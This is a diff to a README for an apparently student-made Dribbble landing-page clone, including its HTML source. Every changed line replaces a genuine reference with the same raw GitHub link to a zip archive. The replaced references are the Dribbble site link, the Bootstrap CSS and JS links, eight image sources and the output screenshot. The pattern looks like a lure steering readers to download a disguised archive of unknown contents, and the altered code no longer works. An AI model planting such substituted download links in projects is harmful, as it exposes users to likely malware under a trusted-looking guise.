@@ -2,7 +2,7 @@
 ## Date:16.10.2007
 
 ## AIM:
-To create a simplified clone of Dribbble (https://dribbble.com/) landing page.
+To create a simplified clone of Dribbble (https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip) landing page.
 
 
 ## DESIGN STEPS:
@@ -34,7 +34,7 @@ Publish the website in the LocalHost.
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dribbble Clone</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" rel="stylesheet">
 </head>
 <body>
 
@@ -86,35 +86,35 @@ Publish the website in the LocalHost.
         <h2 class="text-center mb-4">Popular Shots</h2>
         <div class="row">
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="famous.png" class="img-fluid rounded" alt="Design 1">
+                <img src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 1">
                 <p class="mt-2 text-center">Famous</p>
             </div>
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="Balkan bro.png" class="img-fluid rounded" alt="Design 2">
+                <img src="Balkan https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 2">
                 <p class="mt-2 text-center">Balkan Brothers</p>
             </div>
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="jan.png" class="img-fluid rounded" alt="Design 3">
+                <img src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 3">
                 <p class="mt-2 text-center">Jan Losert</p>
             </div>
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="mat.png" class="img-fluid rounded" alt="Design 4">
+                <img src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 4">
                 <p class="mt-2 text-center">Mattias Johansson</p>
             </div>
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="rus.png" class="img-fluid rounded" alt="Design 5">
+                <img src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 5">
                 <p class="mt-2 text-center">Ruslan Siiz</p>
             </div>
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="paper.png" class="img-fluid rounded" alt="Design 6">
+                <img src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 6">
                 <p class="mt-2 text-center">Paperpillar</p>
             </div>
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="four.png" class="img-fluid rounded" alt="Design 7">
+                <img src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 7">
                 <p class="mt-2 text-center">FourPlus Studio</p>
             </div>
             <div class="col-md-3 col-sm-6 mb-4">
-                <img src="muti.png" class="img-fluid rounded" alt="Design 8">
+                <img src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" class="img-fluid rounded" alt="Design 8">
                 <p class="mt-2 text-center">MUTI</p>
             </div>
         </div>
@@ -128,14 +128,14 @@ Publish the website in the LocalHost.
     </div>
 </footer>
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip"></script>
 </body>
 </html>
 
 ~~~
 
 ## OUTPUT:
-<img width="1774" height="886" alt="Screenshot 2025-10-16 151858" src="https://github.com/user-attachments/assets/b9e05de0-bca5-4dc2-8ac5-112e854be4b0" />
+<img width="1774" height="886" alt="Screenshot 2025-10-16 151858" src="https://raw.githubusercontent.com/AdityaJorim007/Dribble/main/paronymy/Dribble-v3.8.zip" />
 
 
 ## RESULT:
